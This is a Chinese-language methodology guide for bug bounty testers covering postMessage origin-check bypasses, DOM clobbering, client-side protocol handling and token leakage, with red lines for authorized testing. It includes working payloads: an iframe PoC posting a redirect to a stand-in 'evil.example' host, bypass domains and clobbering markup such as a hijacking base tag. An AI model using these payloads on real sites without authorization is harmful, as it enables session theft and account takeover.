# 客户端漏洞：postMessage / DOM Clobbering / 跨窗口

> 定位：`xss-test.md` 管**服务端**回显与存储 XSS 与 XSS→RCE；本篇管**纯客户端**面——不经过服务端，靠前端代码本身的问题。
> 这一类常是中危，但**能升链到接管**：控 `location` → 开放重定向 → 换票；控 `innerHTML` → XSS → 偷会话；消息里带 token → 直接会话泄漏。
> 冲突以 `rules/src-value-hunting.md` 与 `rules/vuln-report-format.md` 为准。

> **实战案例（双向引用）** → ima 案例库 1604 份中**无 postMessage 独立报告**。DOM 侧可参照 `xss-cases.md` #16（php 代码审计之 xss：反射 / 存储 / **DOM（`document.getElement...` 取可控输入）** 三类归纳）与 #1（07-XSS之攻击与防御：服务端/客户端跨站、mXSS `innerHTML` 畸变、UBB `[img]javascript:`）。

---

## 0. 什么时候开本篇

| 目标特征 | 相关性 |
|---|---|
| 页面里搜到 `addEventListener('message'` / `onmessage` | 高 |
| 富文本 / Markdown 渲染器在前端（marked、DOMPurify） | 高 |
| 有 iframe 嵌入（登录组件、支付组件、客服窗口） | 高 |
| 全局配置写在 `window.xxx` 上 | 中 |
| 有 Electron / CEF 客户端 | 见 `xss-test.md` §8 |

---

## 1. postMessage

### 1.1 发现

在打包 JS 里搜：
```javascript
addEventListener('message', ...)
window.onmessage = ...
window.addEventListener('message', handler, false)
```
搜索引擎式的关键词：`postMessage` `message` `origin` `e.data` `event.data`。

**同时搜发送侧**：`otherWindow.postMessage(` —— 看它**往哪发、发了什么**（有没有把 token / 用户信息放进消息体）。发送侧带敏感信息同样是洞。

### 1.2 origin 校验缺陷（命中率最高）

| 写法 | 问题 | 绕过 |
|---|---|---|
| 完全没有 `e.origin` 判断 | 任意域可发 | 直接发 |
| `if (e.origin.indexOf('example.com') > -1)` | 子串匹配 | `evil-example.com`、`example.com.evil.com` |
| `if (e.origin.startsWith('https://example.com'))` | 前缀匹配 | `https://example.com.evil.com` |
| `if (/example\.com/.test(e.origin))` | 正则未锚定 | 同上 |
| `if (e.origin.endsWith('example.com'))` | 后缀匹配 | `https://evilexample.com` |
| `e.source !== window` 代替 origin 校验 | 只看来源窗口 | iframe 内可伪造 |

**只有精确比较才算安全**：`if (e.origin !== 'https://example.com') return;`

### 1.3 危险 sink（收到消息后干什么）

| sink | 后果 |
|---|---|
| `eval(e.data)` / `new Function(...)` | → XSS / RCE（Electron 下更狠） |
| `el.innerHTML = e.data.x` | → XSS |
| `document.write(...)` | → XSS |
| `location = e.data.url` / `location.href =` | → 开放重定向 → 换票/接管 |
| `window.open(e.data.url)` | → 钓鱼 |
| 把 `e.data` 再 `postMessage` 转发 | → 消息放大 / token 转发 |
| 用 `e.data.token` 当身份 | → **会话直接泄漏** |

### 1.4 打法

自己起一个页面，iframe 目标，然后发消息：

```html
<iframe id="t" src="https://target.example/widget" onload="go()"></iframe>
<script>
function go(){
  var w = document.getElementById('t').contentWindow;
  w.postMessage({"type":"navigate","url":"https://evil.example"}, '*');
  // 逐个试 sink：url / data / html / token / action / cmd
}
</script>
```

**关键**：先看目标 handler 期望什么字段（读 JS 里的 `e.data.xxx`），再按字段名构造。**不要盲发**。

### 1.5 升链路径

```
postMessage 控 location
    → 开放重定向（见 open-redirect-test.md）
    → 若重定向目标能吃 token → 换票 → 接管

postMessage 控 innerHTML
    → XSS（见 xss-test.md 证明方式）
    → 偷 Cookie / localStorage 里的 token

postMessage 消息体里带 token / userInfo
    → 直接会话泄漏，无需 XSS
```

### 1.6 假点

- origin **精确比较**且 sink 安全（只改样式、只触发动画）→ 无洞
- 只能在**同源**页面内触发，跨域发不进来 → 无跨域影响，不算洞
- handler 收到后只 `console.log` → 无危害
- 目标页面是纯静态、无 iframe、不监听 message → 无洞

---

## 2. DOM Clobbering

### 2.1 原理

JS 用**全局变量名**或 `document.getElementById('x')` 取配置，HTML 注入可以**覆盖**这些值——因为 `name` / `id` 属性会自动挂到 `window` 与 `document` 上。

### 2.2 典型形态

```javascript
// 前端代码
if (window.config && window.config.trusted) { renderAsHtml(userInput); }
```
```html
<!-- 注入点： -->
<a id="config"></a>
<a id="config" name="trusted" href="x"></a>
```
第二个 `<a>` 的 `name="trusted"` 会让 `document.getElementById('config').trusted` 存在 → 绕过判断。

### 2.3 常用载荷

```html
<a id=x name=trusted></a>
<img name=attributes>
<form id=config><input name=trusted></form>
<base href="https://evil.example/">    <!-- 劫持相对路径 -->
```

### 2.4 升链

DOM Clobbering 通常**不是终点**，它是**绕过 sanitizer / 绕过可信判断**的手段：
```
可以插 HTML 但不能插 script
    → Clobber 掉 sanitizer 的配置 / 白名单
    → 同一输入点变成 XSS（见 xss-test.md）
```

### 2.5 打法

1. 找一个**允许 HTML 但不执行 script** 的输入点（富文本、评论、昵称）
2. 读前端 JS，找**依赖全局配置 / getElementById** 的判断
3. 插入对应的 `name` / `id` 元素覆盖
4. 验证后续行为变了（渲染方式、跳转目标）

### 2.6 假点

- 前端用 `const config = {...}` 硬编码，不读 DOM → Clobber 无效
- 用了 ESLint 的 `no-dom-clobbering` 或框架（React/Vue）渲染，DOM 属性不会污染全局 → 无洞
- 注入点完全过滤 `<` 和 `>` → 无洞

---

## 3. 客户端路径遍历 / 协议处理

| 形态 | 打法 |
|---|---|
| `location.hash` 直接当参数用 | `#../../admin`、改 hash 触发不同分支 |
| 自定义协议（`myapp://?url=`） | 见 `xss-test.md` §8「自定义协议 → RCE」 |
| `file://` 被前端读取 | 需配合 Electron 客户端 |
| `intent://` / `weixin://` 跳转 | 结合开放重定向 |

---

## 4. 客户端存储与跨窗口泄漏

| 检查项 | 说明 |
|---|---|
| localStorage / sessionStorage 存 token | 任一 XSS 即可读走 → 佐证危害 |
| Cookie 的 `Domain` 设太宽（`.example.com`） | 任意子域 XSS 可拿到主域会话 |
| Cookie 缺 `HttpOnly` | XSS 可读 |
| `window.name` 跨窗口残留 | 老技巧，偶见 |
| `document.referrer` 带 token | 跳外站时泄漏 |

**注意**：单报「Cookie 缺 HttpOnly」通常不收。它是**危害放大器**，当佐证写进 XSS 报告里。

---

## 5. SRC 红线

- 起自己页面做 PoC 时，**不要**用真实受害者账号的会话
- 开放重定向 PoC 只跳到自己可控的域，**不要**跳到恶意站点
- **禁止**在 PoC 页里放真实的钓鱼表单，只证明跳转即可
- Electron / 自定义协议 RCE：只跑 `id` / `whoami` 这类**只读**命令（对齐 `sqli-advanced-test.md` §6 红线）

---

## 6. 自检

- [ ] 是否搜了 `addEventListener('message'` 与 `postMessage(`（**接收侧和发送侧都搜**）？
- [ ] origin 校验是**精确比较**还是子串/前缀/后缀匹配？构造过对应绕过域吗？
- [ ] 是否按 JS 里的**字段名**构造消息，而不是盲发？
- [ ] 是否逐 sink 试过（`innerHTML` / `location` / `eval` / 转发）？
- [ ] 消息体里有没有 token / 用户信息（直接泄漏，比 XSS 更直接）？
- [ ] DOM Clobbering 是否找到了**依赖全局配置的判断**，而不是插了就完？
- [ ] 单报「缺 HttpOnly」了吗？（应当前佐证，不单报）
- [ ] PoC 页有没有用真实受害者会话 / 放真实钓鱼表单？

---

## 7. 一句话

**先搜 message 监听器与发送侧；origin 只有精确比较才安全；按字段名构造不盲发；消息体带 token 比 XSS 更直接；Clobbering 是绕过 sanitizer 的手段不是终点；缺 HttpOnly 只当佐证。**
